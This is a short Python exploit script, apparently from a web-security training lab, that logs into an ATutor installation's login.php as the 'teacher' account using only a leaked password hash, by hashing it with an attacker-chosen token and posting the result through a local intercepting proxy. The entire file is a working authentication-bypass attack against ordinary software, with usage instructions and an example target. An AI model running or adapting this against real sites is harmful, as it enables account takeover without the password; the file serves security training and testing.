import sys, hashlib, requests

def gen_hash(passwd, token):
    # COMPLETE THIS FUNCTION
    # SHA1(CONCAT(password, '%s'))
    m = hashlib.sha1()
    m.update(passwd + token)
    return m.hexdigest()

def we_can_login_with_a_hash():
    target = "http://%s/ATutor/login.php" % sys.argv[1]
    proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
    token = "hax"
    hashed = gen_hash(sys.argv[2], token)
    d = {
        "form_password_hidden" : hashed,
        "form_login": "teacher",
        "submit": "Login",
        "token" : token
    }
    s = requests.Session()
    r = s.post(target, data=d, verify=False, proxies=proxies)
    res = r.text
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        return True
    return False

def main():
    if len(sys.argv) != 3:
        print ("(+) usage: %s <target> <hash>" % sys.argv[0])
        print ("(+) eg: %s 192.168.140.103 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e" % sys.argv[0])
        sys.exit(-1)
    if we_can_login_with_a_hash():
        print ("(+) success!")
    else:
        print ("(-) failure!")

if __name__ == "__main__":
    main()